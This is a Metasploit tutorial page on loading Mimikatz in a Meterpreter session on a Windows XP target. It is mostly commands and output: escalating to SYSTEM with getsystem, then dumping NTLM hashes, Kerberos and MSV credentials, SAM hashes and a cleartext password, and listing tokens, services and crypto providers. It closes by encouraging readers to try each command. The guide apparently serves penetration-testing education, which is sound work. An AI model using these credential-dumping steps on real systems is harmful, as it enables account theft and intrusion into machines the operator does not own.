---
draft: false
title: MSF Mimikatz
linkTitle: Mimikatz
weight: 500
translationKey: msf-mimikatz
date: 2017-06-16T13:59:00+03:00
author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))
description: In this article, we will look at examples of using the Mimikatz application within the Metasploit Framework.
url: /msf-mimikatz/
featured_image: /images/metasploit.jpg
categories:
  - Metasploit Framework
tags:
  - cybersecurity
  - metasploit framework
---
Metasploit Framework provides versatile usage opportunities. For this reason, it is possible to include codes from external sources into the system. In this article, we will look at examples of mimikatz application usage in Metasploit Framework.

## What is Mimikatz?

Mimikatz is essentially a post-exploitation program written by Benjamin Delpy. It is used to collect information from the target computer. Mimikatz has incorporated many different commands required for collecting information.

## Installing Mimikatz

Mimikatz can be run after opening a Meterpreter session on the target system. It runs in memory without the need to load any files into the system. In order for it to work effectively, we need to have session permissions at the SYSTEM level.

```bash
meterpreter > getuid
Server username: WINXP-E95CE571A1\Administrator
```

In this output, it is seen that we are not at the SYSTEM level on the target system. First, let's try to get to the SYSTEM level.

```bash
meterpreter > getsystem
...got system (via technique 1).

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

If you were successful, you will get the output as above that you have moved to the SYSTEM level.

Mimikatz is designed to work on 32-bit and 64-bit architectures. After moving to the SYSTEM level, we need to check the architecture of the target system with the `sysinfo` command. Sometimes, the Meterpreter session may be logged into a 32-bit architecture process running on a 64-bit architecture. In this case, some features of mimikatz will not work. If the Meterpreter session is running in a 32-bit process (even though the architecture is actually 64-bit), mimikatz will try to use software for 32-bit. The way to prevent this is to look at the running processes with the `ps` command and move to another process with the `migrate` command.

```bash
meterpreter > sysinfo
Computer : WINXP-E95CE571A1
OS : Windows XP (Build 2600, Service Pack 3).
Architecture : x86
System Language : en_US
Meterpreter : x86/win32
```

In the output seen here, we see that the target machine is already on a 32-bit architecture. So, there is no 32-bit, 64-bit conflict. Now we can load the `mimikatz` module.

```bash
meterpreter > load mimikatz
Loading extension mimikatz...success.
```

After the installation is successfully completed, let's first view the help information.

```bash
meterpreter > help mimikatz

Mimikatz Commands
**=================**

Command Description
------- -----------
kerberos Attempt to retrieve kerberos creds
livessp Attempt to retrieve livessp creds
mimikatz_command Run a custom command
msv Attempt to retrieve msv creds (hashes)
ssp Attempt to retrieve ssp creds
tspkg Attempt to retrieve tspkg creds
wdigest Attempt to retrieve wdigest creds
```

Mimikatz basically allows us to use the above commands, but the most powerful of them is the `mimikatz_command` option.

First, let's check the mimikatz version.

```bash
meterpreter > mimikatz_command -f version
mimikatz 1.0 x86 (RC) (Nov 7 2013 08:21:02)
```

There are a number of modules provided by mimikatz. To see the list of these modules, it is enough to give a module name that is not found in the system. In this case, mimikatz will give you a list of available modules. Pay attention to the `modulename::` format when using the command.

In the example below, the `fu::` module is requested. Since there is no such module, we have listed all available modules.

```bash
meterpreter > mimikatz_command -f fu::
Module : 'fu' introuvable

Modules available:
 -Standard
 crypto - Cryptographie et certificates
 hash - hash
 system - Gestion system
 process - Manipulation des processus
 thread - Manipulation des threads
 service - Manipulation des services
 privilege - Manipulation des privilèges
 handle - Manipulation des handles
 impersonate - Manipulation tokens d'accès
 winmine - Manipulation du démineur
 minesweeper - Manipulation du démineur 7
 nogpo - Anti-gpo et patches divers
 samdump - Dump de SAM
 inject - Injecteur de librairies
 ts - Terminal Server
 divers - Fonctions diverses n'ayant pas encore assez de corps pour avoir leurs propres module
sekurlsa - Dump des sessions courantes par providers LSASS
efs - Manipulations EFS
```

To list the available options of the modules in this list, the command entered by giving the module name is used in the following format.

```bash
meterpreter > mimikatz_command -f divers::
Module : 'divers' identifié, mais commande '' introuvable

Description du module : Fonctions diverses n'ayant pas encore assez de corps pour avoir leurs propres module
 noroutemon - [experimental] Patch Juniper Network Connect pour ne plus superviser la table de routage
 eventdrop - [super experimental] Patch l'observateur d'événements pour ne plus rien enregistrer
 cancelator - Patch le bouton annuler de Windows XP et 2003 en console pour déverrouiller une session
 secrets - Affiche les secrets utilisateur
```

As you can see, the `divers` module has `noroutemon, eventdrop, cancelator, secrets` options.

## Reading Hash and Password from RAM Memory

To read Hash values ​​and passwords from RAM memory, we can use the Metasploit Framework's own commands or we can use `mimikaz` modules.

## Obtaining Information with Metasploit Commands

```bash
meterpreter > msv
[+] Running as SYSTEM
[*] Retrieving msv credentials
msv credentials
===============

AuthID Package Domain User Password
------ ------- ------ ---- --------
0;78980 NTLM WINXP-E95CE571A1 Administrator lm{ 000000000000000000000000000000000 }, ntlm{ d6eec67681a3be111b5605849505628f }
0;996 Negotiate NT AUTHORITY NETWORK SERVICE lm{ aad3b435b51404eeaad3b435b51404ee }, ntlm{ 31d6cfe0d16ae931b73c59d7e0c089c0 }
0;997 Negotiate NT AUTHORITY LOCAL SERVICE n.s. (Credentials KO)
0;56683 NTLM n.s. (Credentials KO)
0;999 NTLM WORKGROUP WINXP-E95CE571A1$ n.s. (Credentials KO)

meterpreter > kerberos
[+] Running as SYSTEM
[*] Retrieving kerberos credentials
kerberos credentials
=====================

AuthID Package Domain User Password
------ ------- ------ ---- --------
0;999 NTLM WORKGROUP WINXP-E95CE571A1$
0;997 Negotiate NT AUTHORITY LOCAL SERVICE
0;56683NTLM
0;996 Negotiate NT AUTHORITY NETWORK SERVICE
0;78980 NTLM WINXP-E95CE571A1 Administrator SuperSecretPassword
```

## Obtaining Information with Mimikatz Modules Don't

```bash
meterpreter > mimikatz_command -f samdump::hashes
Ordinateur: winxp-e95ce571a1
BootKey: 553d8c1349162121e2a5d3d0f571db7f

Free: 500
User: Administrator
LM:
NTLM : d6eec67681a3be111b5605849505628f

Free: 501
User: Guest
LM:
NTLM:

Free: 1000
User: HelpAssistant
LM : 6165cd1a0ebc61e470475c82cd451e14
NTLM :

rid : 1002
User : SUPPORT_388945a0
LM:
NTLM : 771ee1fce7225b28f8aec4a88aea9b6a

meterpreter > mimikatz_command -f sekurlsa::searchPasswords
[0] { Administrator ; WINXP-E95CE571A1 ; SuperSecretPassword }
```

## Other Modules

There are other modules besides the ones shown as examples above. You can review all of them on the [Mimikatz](http://blog.gentilkiwi.com/) website.

## User Token Information

```bash
meterpreter > mimikatz_command -f handle::
Module : 'handle' identifié, mais commande '' introuvable

Description du module : Manipulation des handles
list - Affiche les handles du système (pour le moment juste les processus et tokens)
processStop - Essaye de stopper un ou plusieurs processus en utilisant d'autres handles
tokenImpersonate - Essaye d'impersonaliser un token en utilisant d'autres handles
nullAcl - Positionne une ACL null sur des Handles
meterpreter > mimikatz_command -f handle::list
...snip...
 760 lsass.exe -> 1004 Token NT AUTHORITY ETWORK SERVICE
 760 lsass.exe -> 1008 Process 704 winlogon.exe
 760 lsass.exe -> 1052 Process 980 svchost.exe
 760 lsass.exe -> 1072 Process 2664 fubar.exe
 760 lsass.exe -> 1084 Token NT AUTHORITY\LOCAL SERVICE
 760 lsass.exe -> 1096 Process 704 winlogon.exe
 760 lsass.exe -> 1264 Process 1124 svchost.exe
 760 lsass.exe -> 1272 Token NT AUTHORITY\ANONYMOUS LOGON
 760 lsass.exe -> 1276 Process 1804 psia.exe
 760 lsass.exe -> 1352 Process 480 jusched.exe
760 lsass.exe -> 1360 Process 2056 TPAutoConnSvc.exe
760 lsass.exe -> 1424 Token WINXP-E95CE571A1\Administrator
...snip...
```

## Windows Services Operations

Mimikatz also provides the ability to start, stop and remove Windows services. Let's look at the service module and its options.

```bash
meterpreter > mimikatz_command -f service::
Module : 'service' identifié, mais commande '' introuvable

Description du module : Manipulation des services
 list - List les services et pilotes
 start - Démarre un service ou pilote
 stop - Arrête un service ou pilote
 remove - Supprime un service ou pilote
 mimikatz - Installe et/ou démarre le pilote mimikatz
```

From these options, let's use the listing module.

```bash
meterpreter > mimikatz_command -f service::list
...snip...
 WIN32_SHARE_PROCESS STOPPED RemoteRegistry Remote Registry
 KERNEL_DRIVER RUNNING RFCOMM Bluetooth Device (RFCOMM Protocol TDI)
 WIN32_OWN_PROCESS STOPPED RpcLocator Remote Procedure Call (RPC) Locator
 980 WIN32_OWN_PROCESS RUNNING RpcSs Remote Procedure Call (RPC)
 WIN32_OWN_PROCESS STOPPED RSVP QoS RSVP
 760 WIN32_SHARE_PROCESS RUNNING SamSs Security Accounts Manager
 WIN32_SHARE_PROCESS STOPPED SCardSvr Smart Card
 1124 WIN32_SHARE_PROCESS RUNNING Schedule Task Scheduler
KERNEL_DRIVER STOPPED Secdrv Secdrv
1124 INTERACTIVE_PROCESS WIN32_SHARE_PROCESS RUNNING seclogon Secondary Logon
1804 WIN32_OWN_PROCESS RUNNING Secunia PSI Agent Secunia PSI Agent
3460 WIN32_OWN_PROCESS RUNNING Secunia Update Agent Secunia Update Agent
...snip...
```

## Crypto Module

Let's look at the crypto module and options provided by Mimikatz.

```bash
meterpreter > mimikatz_command -f crypto::
Module : 'crypto' identifié, mais commande '' introuvable

Description du module : Cryptographie et certificates
listProviders - List les providers installés)
 listStores - List les magasins système
listCertificates - List les certificats
 listKeys - List les conteneurs de clés
exportCertificates - Exporte les certificats
 exportKeys - Exporte les clés
 patchcng - [experimental] Patch le gestionnaire de clés pour l'export de clés non exportable
 patchcapi - [experimental] Patch la CryptoAPI courante pour l'export de clés non exportable
```

From these options Let's use the `listProviders` option.

```bash
meterpreter > mimikatz_command -f crypto::listProviders
Providers CryptoAPI:
 Gemplus GemSAFE Card CSP v1.0
 Infineon SICRYPT Base Smart Card CSP
 Microsoft Base Cryptographic Provider v1.0
 Microsoft Base DSS and Diffie-Hellman Cryptographic Provider
 Microsoft Base DSS Cryptographic Provider
 Microsoft Base Smart Card Crypto Provider
 Microsoft DH SChannel Cryptographic Provider
 Microsoft Enhanced Cryptographic Provider v1.0
 Microsoft Enhanced DSS and Diffie-Hellman Cryptographic Provider
 Microsoft Enhanced RSA and AES Cryptographic Provider (Prototype)
 Microsoft RSA SChannel Cryptographic Provider
 Microsoft Strong Cryptographic Provider
```

As you can see from the examples above, there are modules belonging to Mimikatz and their options. I recommend that you gain experience by trying the commands one by one, within a wide range of possibilities.
